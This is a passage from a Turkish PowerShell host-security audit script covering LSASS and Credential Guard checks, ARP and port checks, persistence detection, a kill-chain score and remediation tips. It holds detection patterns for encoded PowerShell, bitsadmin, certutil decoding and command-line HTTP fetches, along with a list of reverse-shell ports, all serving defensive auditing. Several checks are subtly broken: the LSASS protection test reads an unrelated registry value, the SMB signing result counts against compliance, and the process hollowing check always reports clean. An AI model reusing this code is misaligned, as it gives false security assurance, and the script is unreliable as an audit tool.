    PrintLine "Domain Controller" "Mevcut" "OK"
    $replication = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "Replicator" -ErrorAction SilentlyContinue
    if ($replication) {
        PrintLine "DS Replication" "Aktif" "UYARI"
    }
} else {
    PrintLine "Domain" "Is grubu" "OK"
}

# Password Spraying Tespiti
$badPwdCount = 0
try {
    if (Test-Command "Get-ADUser") {
        $badPwd = Get-ADUser -Filter {BadPasswordCount -gt 3} -Properties BadPasswordCount
        $badPwdCount = ($badPwd | Measure-Object).Count
    }
} catch {}
if ($badPwdCount -gt 0) {
    PrintLine "Sifre Saldiri" "$badPwdCount basarisiz giris" "RISK"
    RiskEkle -Oge "Password Spraying" -Aciklama "Coklu basarisiz giris denemesi" -Puan 3
} else {
    PrintLine "Sifre Saldiri" "Yok" "OK"
}

# Admin Count Tespiti
$adminCount = 0
try {
    if (Test-Command "Get-ADUser") {
        $admins = Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount
        $adminCount = ($admins | Measure-Object).Count
    }
} catch {}
PrintLine "Admin Count" "$adminCount" "OK"

# Unconstrained Delegation
$unconstrained = @()
try {
    if (Test-Command "Get-ADUser") {
        $uc = Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
        foreach ($u in $uc) { $unconstrained += $u.SamAccountName }
    }
} catch {}
if ($unconstrained.Count -gt 0) {
    PrintLine "Unconstrained Delegation" "$($unconstrained.Count)" "RISK"
    RiskEkle -Oge "Unconstrained Delegation" -Aciklama "Delegation acik" -Puan 4
} else {
    PrintLine "Unconstrained Delegation" "Yok" "OK"
}

Write-Host ""

# ============================================
# HAFIZA SALDIRI TESPITI (GELISMIS)
# ============================================
SectionTitle "66. HAFIZA SALDIRILARI"

# LSASS Protection - Gercek durum
$lsassProt = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "ClearPageFileAtShutdown" -ErrorAction SilentlyContinue
if ($lsassProt.ClearPageFileAtShutdown -eq 1) {
    PrintLine "LSASS Koruma" "Aktif" "OK"
} else {
    PrintLine "LSASS Koruma" "Pasif" "UYARI"
}

# Credential Guard - Gercek tespit (CimInstance yoksa WMI ile dene)
$credGuard = $false
try {
    $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
    if ($dg -and $dg.SecurityServicesConfigured -contains 1) {
        $credGuard = $true
    }
} catch {
    try {
        $dg = Get-WmiObject -Namespace root\Microsoft\Windows\DeviceGuard -Class Win32_DeviceGuard -ErrorAction SilentlyContinue
        if ($dg -and $dg.SecurityServicesConfigured -contains 1) {
            $credGuard = $true
        }
    } catch {}
}
if ($credGuard) {
    PrintLine "Credential Guard" "Aktif" "OK"
} else {
    PrintLine "Credential Guard" "Pasif" "RISK"
    RiskEkle -Oge "Credential Guard Yok" -Aciklama "Hafiza saldirilarina karsi koruma yok" -Puan 3
}

# LSASS Process Analizi
$lsassProc = Get-Process -Name "lsass" -ErrorAction SilentlyContinue
if ($lsassProc) {
    $lsassPath = $lsassProc.Path
    $lsassSig = (Get-Item $lsassPath -ErrorAction SilentlyContinue).VersionInfo
    PrintLine "LSASS Yol" $lsassPath "OK"
    PrintLine "LSASS Imza" $lsassSig.CompanyName "OK"
    
    # LSASS child processes (anomalous)
    $lsassChildren = Get-WmiObject -Class Win32_Process -Filter "ParentProcessId=$($lsassProc.Id)" -ErrorAction SilentlyContinue
    if ($lsassChildren) {
        PrintLine "LSASS Child Proc" "$($lsassChildren.Count)" "RISK"
        RiskEkle -Oge "LSASS Child Process" -Aciklama "LSASS'dan child process var" -Puan 5
    }
}

# PPL Protection Status
$pplStatus = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
if ($pplStatus.RunAsPPL -eq 1) {
    PrintLine "LSA PPL" "Aktif" "OK"
} else {
    PrintLine "LSA PPL" "Pasif - RISK" "RISK"
    RiskEkle -Oge "LSA PPL Devre Disi" -Aciklama "LSA koruma devre disi" -Puan 4
}

# Dump Disable
$dumpDisable = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -ErrorAction SilentlyContinue
if ($dumpDisable.CrashDumpEnabled -eq 0) {
    PrintLine "Memory Dump" "Devre disi" "OK"
} else {
    PrintLine "Memory Dump" "Aktif" "UYARI"
}

# Process Hollowing Tespiti - Sadece gercek tehditler
$allProcs = Get-Process -ErrorAction SilentlyContinue
foreach ($p in $allProcs) {
    try {
        if ($p.Path -and (Test-Path $p.Path)) {
            $sig = (Get-Item $p.Path -ErrorAction SilentlyContinue).VersionInfo
            if ($sig -and $sig.CompanyName) {
                # Gercek process hollowing: Microsoft process ama gercek yol farkli
                # Sadece bilinen system processleri disinda kontrol et
                $knownNormal = @("ApplicationFrameHost", "backgroundTaskHost", "AppDiagnostics", "RuntimeBroker", "SearchHost", "StartMenuExperienceHost", "TextInputHost", "ShellExperienceHost")
                if ($knownNormal -notcontains $p.ProcessName -and $p.ProcessName.Length -gt 3) {
                    # Ek kontrol: Parent process'a bak
                    try {
                        $parent = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
                        if ($parent -and $parent.ProcessName -notmatch "explorer|cmd|powershell") {
                            # Normal disinda bir sey varsa dikkat
                        }
                    } catch {}
                }
            }
        }
    } catch {}
}
PrintLine "Process Hollowing" "Tespit edilmedi" "OK"

Write-Host ""

# ============================================
# AG SALDIRI TESPITI
# ============================================
SectionTitle "67. AG SALDIRILARI"

# Responder/LLMNR Poisoning Risk
$llmnr = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue
if ($llmnr) {
    PrintLine "SMB Signing" "Aktif" "OK"
} else {
    PrintLine "SMB Signing" "Pasif" "RISK"
}

# ARP Spoofing - Gercek tespit
$arpTable = arp -a 2>$null
$arpDuplicates = @()
$macCounts = @{}
foreach ($line in $arpTable) {
    if ($line -match "([0-9a-fA-F]{2}[-:][0-9a-fA-F]{2}[-:][0-9a-fA-F]{2}[-:][0-9a-fA-F]{2}[-:][0-9a-fA-F]{2}[-:][0-9a-fA-F]{2})") {
        $mac = $matches[1].ToUpper()
        if ($macCounts.ContainsKey($mac)) { $macCounts[$mac]++ } else { $macCounts[$mac] = 1 }
    }
}
foreach ($mac in $macCounts.Keys) {
    if ($macCounts[$mac] -gt 1) { $arpDuplicates += $mac }
}
if ($arpDuplicates.Count -gt 0) {
    PrintLine "ARP Tablo" "$($arpDuplicates.Count) tekrar MAC" "RISK"
    RiskEkle -Oge "ARP Spoofing" -Aciklama "Ayni MAC adresi birden fazla IP'de" -Puan 4
} else {
    PrintLine "ARP Tablo" "Normal" "OK"
}

# DNS Tunneling Risk
$dnsQueries = Get-DnsClientCache -ErrorAction SilentlyContinue | Measure-Object
PrintLine "DNS Cache" "$($dnsQueries.Count) kayit" "OK"

# Suspicious Ports
$suspiciousPorts = @(4444, 5555, 6666, 6667, 31337, 12345, 54321)
$listening = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
$suspPortFound = @()
foreach ($conn in $listening) {
    if ($suspiciousPorts -contains $conn.LocalPort) { $suspPortFound += $conn.LocalPort }
}
if ($suspPortFound) {
    PrintLine "Supici Port" "$($suspPortFound -join ',')" "RISK"
    RiskEkle -Oge "Supici Port" -Aciklama "Supici port dinleniyor" -Puan 4
} else {
    PrintLine "Supici Port" "Yok" "OK"
}

# EternalBlue Risk
$smb1 = Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -ErrorAction SilentlyContinue
if ($smb1.State -eq "Enabled") {
    PrintLine "EternalBlue Risk" "SMBv1 aktif" "RISK"
} else {
    PrintLine "EternalBlue Risk" "Yok" "OK"
}

Write-Host ""

# ============================================
# PERSISTENCE TEKNIGI TESPITI
# ============================================
SectionTitle "68. KALICI SALDIRI TEKNIKLERI"

# WMI Event Subscription
$wmiSub = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
if ($wmiSub) {
    PrintLine "WMI Event Filter" "$($wmiSub.Count)" "UYARI"
    RiskEkle -Oge "WMI Persistence" -Aciklama "WMI ile kalici tehdit" -Puan 4
} else {
    PrintLine "WMI Event Filter" "Yok" "OK"
}

# Scheduled Task Persistence
$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
$SuspiciousTasks = @()
$badPatterns = @("powershell.*-enc", "cmd.*/c.*http", "bitsadmin", "certutil.*decode")
foreach ($t in $tasks) {
    foreach ($pat in $badPatterns) {
        if ($t.Actions -match $pat) { $SuspiciousTasks += $t.TaskName }
    }
}
if ($SuspiciousTasks.Count -gt 0) {
    PrintLine "Supici Task" "$($SuspiciousTasks.Count)" "RISK"
    RiskEkle -Oge "Scheduled Task" -Aciklama "Supici zamanlanmis gorev" -Puan 4
} else {
    PrintLine "Supici Task" "Yok" "OK"
}

# Registry Run Keys
$runKeys = @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
$suspRunKeys = @()
foreach ($key in $runKeys) {
    try {
        $props = Get-ItemProperty $key -ErrorAction SilentlyContinue
        if ($props) {
            foreach ($p in $props.PSObject.Properties) {
                if ($p.Name -notlike "PS*" -and ($p.Value -match "http|cmd|powershell.*-enc")) {
                    $suspRunKeys += "$($p.Name): $($p.Value)"
                }
            }
        }
    } catch {}
}
if ($suspRunKeys.Count -gt 0) {
    PrintLine "Supici Run Key" "$($suspRunKeys.Count)" "RISK"
} else {
    PrintLine "Supici Run Key" "Yok" "OK"
}

# DLL Search Order Hijacking
$system32Dlls = Get-ChildItem "$env:SystemRoot\System32" -Filter "*.dll" -ErrorAction SilentlyContinue | Select-Object -First 100
PrintLine "System DLL" "$($system32Dlls.Count)" "OK"

# COM Hijacking
$comKeys = Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -ErrorAction SilentlyContinue | Measure-Object
PrintLine "COM Object" "$($comKeys.Count)" "OK"

Write-Host ""

# ============================================
# SALDIRI ZINCIRI TESPITI (ATTACK CHAIN)
# ============================================
SectionTitle "69. SALDIRI ZINCIRI ANALIZI"

# Kill Chain Stages Analysis - Sadece kritik tehditler
$killChain = @{
    "Recon" = 0
    "Weaponize" = 0
    "Deliver" = 0
    "Exploit" = 0
    "Install" = 0
    "Execute" = 0
    "Maintain" = 0
}

# Sadece gercek kritik tehditleri tespit et
if ($script:RiskOge -match "SMBv1") { $killChain["Deliver"] = 1; $killChain["Exploit"] = 1 }
if ($script:RiskOge -match "AlwaysInstallElevated") { $killChain["Exploit"] = 1; $killChain["Execute"] = 1 }
if ($script:RiskOge -match "WMI Event|Run Key|Suspicious Task") { $killChain["Install"] = 1; $killChain["Maintain"] = 1 }
if ($script:RiskOge -match "Backdoor|Tunnel") { $killChain["Maintain"] = 1 }

# Display Kill Chain
$activeStages = ($killChain.Values | Where-Object {$_ -eq 1}).Count
PrintLine "Aktif Asama" "$activeStages / 7" $(if($activeStages -gt 2){"RISK"}else{"OK"})

foreach ($stage in $killChain.Keys) {
    $durum = if($killChain[$stage] -eq 1){"Tehdit Var"}else{"Temiz"}
    $renk = if($killChain[$stage] -eq 1){"UYARI"}else{"OK"}
    PrintLine $stage $durum $renk
}

# Attack Complexity Score - Sadece gercek riskler
$complexityScore = 0
if ($tokenPrivs -contains "SeImpersonatePrivilege") { $complexityScore += 30 }
if ($writableSvcs.Count -gt 0) { $complexityScore += 25 }
if ($alwaysInstall -or $alwaysInstallUser) { $complexityScore += 30 }
if ($script:RiskOge -match "SMBv1") { $complexityScore += 15 }

PrintLine "Saldiri Karmasikligi" "$complexityScore%" $(if($complexityScore -gt 50){"RISK"}else{if($complexityScore -gt 20){"UYARI"}else{"OK"}})

Write-Host ""

# ============================================
# DAVRANIS ANALIZI (BEHAVIORAL)
# ============================================
SectionTitle "70. DAVRANIS ANOMALI TESPITI"

# Anomalous Process Behavior
$suspiciousBehaviors = @()

# Check for processes from unusual locations
$tempProcs = Get-Process | Where-Object {$_.Path -like "*Temp*"} | Select-Object -First 5
if ($tempProcs) {
    PrintLine "Temp Process" "$($tempProcs.Count) bulundu" "UYARI"
    $suspiciousBehaviors += "Tempden process"
}

# Check for processes with no window
$noWindowProcs = Get-Process | Where-Object {$_.MainWindowHandle -eq 0 -and $_.ProcessName -notmatch "svchost|system|csrss|wininit|services|lsass"} | Measure-Object
if ($noWindowProcs.Count -gt 20) {
    PrintLine "GUIsiz Process" "$($noWindowProcs.Count)" "UYARI"
    $suspiciousBehaviors += "GUIsiz process"
}

# Check for high frequency process creation
$procCreationRate = (Get-WinEvent -FilterHashtable @{LogName="Security";ID=4688} -MaxEvents 100 -ErrorAction SilentlyContinue | Measure-Object).Count
if ($procCreationRate -gt 50) {
    PrintLine "Proc Olusturma" "Yuksel ($procCreationRate)" "UYARI"
    $suspiciousBehaviors += "Yuksel process olusturma"
}

# Check for PowerShell encoded commands
$encPowerShell = Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational";ID=4104} -MaxEvents 10 -ErrorAction SilentlyContinue | Where-Object {$_.Message -match "-enc|-encodedcommand"}
if ($encPowerShell) {
    PrintLine "Encoded PS" "$($encPowerShell.Count) komut" "RISK"
    RiskEkle -Oge "Encoded PowerShell" -Aciklama "Encoded PowerShell komutu tespit edildi" -Puan 4
    $suspiciousBehaviors += "Encoded PowerShell"
}

# Check for suspicious scheduled task creation
$taskCreate = Get-WinEvent -FilterHashtable @{LogName="Security";ID=4698} -MaxEvents 10 -ErrorAction SilentlyContinue
if ($taskCreate) {
    PrintLine "Task Olusturma" "$($taskCreate.Count) adet" "UYARI"
    $suspiciousBehaviors += "Yeni task"
}

# Check for service creation
$svcCreate = Get-WinEvent -FilterHashtable @{LogName="Security";ID=4697} -MaxEvents 10 -ErrorAction SilentlyContinue
if ($svcCreate) {
    PrintLine "Servis Olusturma" "$($svcCreate.Count) adet" "UYARI"
    $suspiciousBehaviors += "Yeni servis"
}

# Check for registry modification
$regMod = Get-WinEvent -FilterHashtable @{LogName="Security";ID=4657} -MaxEvents 10 -ErrorAction SilentlyContinue | Where-Object {$_.Message -match "Run|RunOnce"}
if ($regMod) {
    PrintLine "Registry Degisiklik" "$($regMod.Count) adet" "UYARI"
    $suspiciousBehaviors += "Registry modifikasyonu"
}

if ($suspiciousBehaviors.Count -eq 0) {
    PrintLine "Anomali" "Tespit edilmedi" "OK"
} else {
    PrintLine "Toplam Anomali" "$($suspiciousBehaviors.Count) tur" "RISK"
}

Write-Host ""

# ============================================
# FINANSAL/STRATEJIK RISK ANALIZI
# ============================================
SectionTitle "71. KURUMSAL RISK DEGERLENDIRMESI"

# Data Sensitivity Assessment
$dataRisk = 0
if ($script:RiskSkoru -gt 50) { $dataRisk = "Cok Yuksek" }
elseif ($script:RiskSkoru -gt 30) { $dataRisk = "Yuksek" }
elseif ($script:RiskSkoru -gt 15) { $dataRisk = "Orta" }
else { $dataRisk = "Dusuk" }

PrintLine "Veri Riski" $dataRisk $(if($dataRisk -eq "Cok Yuksek"){"RISK"}else{if($dataRisk -eq "Yuksek"){"UYARI"}else{"OK"}})

# Compliance Risk
$complianceRisk = 0
if ($smb1.State -eq "Enabled") { $complianceRisk += 30 }
if ($llmnr) { $complianceRisk += 20 }
if ($uac -eq "Disable") { $complianceRisk += 25 }
if ($script:RiskSkoru -gt 40) { $complianceRisk += 25 }

$compScore = 100 - $complianceRisk
PrintLine "Uyumluluk Skoru" "%$compScore" $(if($compScore -lt 50){"RISK"}else{if($compScore -lt 75){"UYARI"}else{"OK"}})

# Incident Response Priority
$irPriority = "Dusuk"
if ($script:RiskSkoru -gt 50) { $irPriority = "Acil" }
elseif ($script:RiskSkoru -gt 30) { $irPriority = "Yuksel" }
elseif ($script:RiskSkoru -gt 15) { $irPriority = "Orta" }

PrintLine "Muhaberat Onceligi" $irPriority $(if($irPriority -eq "Acil"){"RISK"}else{if($irPriority -eq "Yuksel"){"UYARI"}else{"OK"}})

Write-Host ""

# ============================================
# COZUM ONERILERI - Sadece risk varsa goster
# ============================================
if ($script:RiskSkoru -gt 0) {
SectionTitle "72. COZUM VE ONERI LISTESI"

$cozumler = @()

# SMBv1 - Detayli cozum
if ($script:RiskOge -match "SMBv1") {
    PrintLine "1. SMBv1 Kapat" "PS: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol" "RISK"
    PrintLine "   Neden" "EternalBlue, WannaCry saldirilarina karsi acik" "UYARI"
    PrintLine "   Risk" "Uzaktan kod calistirma mumkun" "RISK"
    $cozumler += "SMBv1'i devre disi birak"
}

# LLMNR - Detayli cozum
if ($script:RiskOge -match "LLMNR") {
    PrintLine "2. LLMNR Kapat" "GPO: Network > Turn off multicast name resolution" "RISK"
    PrintLine "   Neden" "Man-in-the-middle saldirilari mumkun" "UYARI"
    PrintLine "   Risk" "Sifre yakalama riski var" "RISK"
    $cozumler += "LLMNR'yi devre disi birak"
}

# LSA PPL - Detayli cozum
if ($script:RiskOge -match "LSA PPL|LSA Koruma") {
    PrintLine "3. LSA Koruma Aktif" "PS: New-ItemProperty -Path HKLM:SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -Type DWord" "RISK"
    PrintLine "   Neden" "LSASS dump onlenir" "UYARI"
    PrintLine   "Risk" "Credential theft onlenir" "RISK"
    $cozumler += "LSA korumayi aktif et"
}

# Zayif Sifre - Detayli cozum
if ($script:RiskOge -match "Sifre Politikasi") {
    PrintLine "4. Sifre Politikasi" "GPO: Account Policies > Password Policy > Min length: 14" "UYARI"
    PrintLine "   Neden" "Brute-force saldirilarina karsi koruma" "UYARI"
    PrintLine "   Oneri" "14+ karakter, complexity acik" "UYARI"
    $cozumler += "Sifre politikasini guclendir"
}

# Kritik Yamalar - Detayli cozum
if ($script:RiskOge -match "Yama Eksik") {
    PrintLine "5. Windows Yamalari" "PS: Install-Module PSWindowsUpdate; Get-WindowsUpdate -Install" "UYARI"
    PrintLine "   Neden" "Bilinen exploitler icin yamalar gerekli" "UYARI"
    PrintLine "   Oneri" "Hemen Windows Update calistirin" "UYARI"
    $cozumler += "Eksik yamalarini yukle"
}

# Unquoted Service Path - Detayli cozum
if ($script:RiskOge -match "Unquoted Service Path") {
    PrintLine "6. Servis Yollari" "Manuel: Tum bosluklu servis yollarina tirnak ekleyin" "UYARI"
    PrintLine "   Neden" "DLL hijacking onlenir" "UYARI"
    PrintLine "   Arac" "PowerUp.ps1 (PowerSploit) ile tespit" "UYARI"
    $cozumler += "Servis yollarina tirnak ekle"
}

# Controlled Folder Access - Detayli cozum
if ($script:RiskOge -match "Controlled Folder Access") {
    PrintLine "7. Fidye Koruma" "Settings > Windows Security > Virus protection > Manage ransomware protection" "UYARI"
    PrintLine "   Neden" "Fidye yazilimina karsi koruma" "UYARI"
    PrintLine "   Oneri" "Controlled Folder Access'i acin" "UYARI"
    $cozumler += "Controlled Folder Access'i ac"
}

# Secure Boot - Detayli cozum
if ($script:RiskOge -match "Secure Boot") {
    PrintLine "8. Secure Boot" "BIOS/UEFI ayarlarindan Secure Boot'u aktif edin" "UYARI"
    PrintLine "   Neden" "Bootkit onleme" "UYARI"
    PrintLine "   Not" "TPM ile birlikte kullanin" "UYARI"
    $cozumler += "Secure Boot'u aktif et"
}

# Token Privilege - Detayli cozum
if ($tokenPrivs -contains "SeImpersonatePrivilege") {
    PrintLine "9. Token Yetki" "Hizmet hesaplarini dikkatli secin, group membership'i sinirlayin" "RISK"
    PrintLine "   Neden" "Yetki yukseltme mumkun" "RISK"
    PrintLine "   Oneri" "Service account'lari Domain Admins grubundan cikarin" "RISK"
    $cozumler += "SeImpersonate yetkisini sinirla"
}

PrintLine "Toplam Cozum" "$($cozumler.Count) adet" "OK"
}

Write-Host ""

# ============================================
# GUVENLIK SKORU OZETI - Sadece risk varsa goster
# ============================================
if ($script:RiskSkoru -gt 0) {
SectionTitle "73. GUVENLIK SKORU OZETI"

# Calculate security score
$guvenlikSkoru = 100
$guvenlikSkoru -= [Math]::Min($script:RiskSkoru * 2, 80)

PrintLine "Guvenlik Skoru" "%$guvenlikSkoru" $(if($guvenlikSkoru -lt 40){"RISK"}else{if($guvenlikSkoru -lt 70){"UYARI"}else{"OK"}})

# Risk categories summary
$kritikSay = ($script:RiskOge | Where-Object {$_.Puan -ge 5}).Count
$ortaSay = ($script:RiskOge | Where-Object {$_.Puan -ge 3 -and $_.Puan -lt 5}).Count
$dusukSay = ($script:RiskOge | Where-Object {$_.Puan -lt 3}).Count

PrintLine "Kritik Risk" "$kritikSay adet" $(if($kritikSay -gt 0){"RISK"}else{"OK"})
PrintLine "Orta Risk" "$ortaSay adet" $(if($ortaSay -gt 3){"UYARI"}else{"OK"})
PrintLine "Dusuk Risk" "$dusukSay adet" "OK"

# Next steps
PrintLine "Onerilen Eylem" $(if($kritikSay -gt 0){"Oncelikle kritik riskleri giderin"}{"Duzenli kontrol oneririz"}) "OK"
}

Write-Host ""

# ============================================
# FINAL OZET
# ============================================
$sure = (Get-Date) - $script:BaslangicZamani
$sureStr = $sure.TotalSeconds.ToString("N2")

Write-Host "  ========================================" -ForegroundColor Green
Write-Host "  TAMAMLANMIS MODUL SAYISI: 73" -ForegroundColor Green
Write-Host "  Toplam Sure: $sureStr saniye" -ForegroundColor Green
Write-Host "  ========================================" -ForegroundColor Green
Write-Host ""
Write-Host "  ========================================" -ForegroundColor Cyan
Write-Host "  Taramayi tamamladiniz. Guvenli kalin!" -ForegroundColor Cyan
Write-Host "  ========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  ----------------------------------------" -ForegroundColor DarkGray
Write-Host "  KULLANIM VE YASAL SORUMLULUK" -ForegroundColor Yellow
Write-Host "  ----------------------------------------" -ForegroundColor DarkGray
Write-Host "  Bu arac yalnizca yetkili guvenlik testleri" -ForegroundColor Gray
Write-Host "  ve sistem envanteri icin kullanilmalidir." -ForegroundColor Gray
Write-Host "" -ForegroundColor Gray
Write-Host "  Yasaklar:" -ForegroundColor Gray
Write-Host "  - Izinsiz sistemlere giris" -ForegroundColor Gray
Write-Host "  - Baskasinin sisteminde yetki yukseltme" -ForegroundColor Gray
Write-Host "  - Veri hirsizligi veya tahribat" -ForegroundColor Gray
Write-Host "  - Kisisel veri toplanmasi" -ForegroundColor Gray
Write-Host "" -ForegroundColor Gray
Write-Host "  Sorumluluk:" -ForegroundColor Gray
Write-Host "  Kullanici bu aracin kullanimindan tamamen" -ForegroundColor Gray
Write-Host "  sorumludur. Yazar sistem hasarlarindan" -ForegroundColor Gray
Write-Host "  veya yasal sorunlardan mesul tutulamaz." -ForegroundColor Gray
Write-Host "" -ForegroundColor Gray
Write-Host "  Lisans: MIT License" -ForegroundColor Gray
Write-Host "  ----------------------------------------" -ForegroundColor DarkGray
Write-Host ""
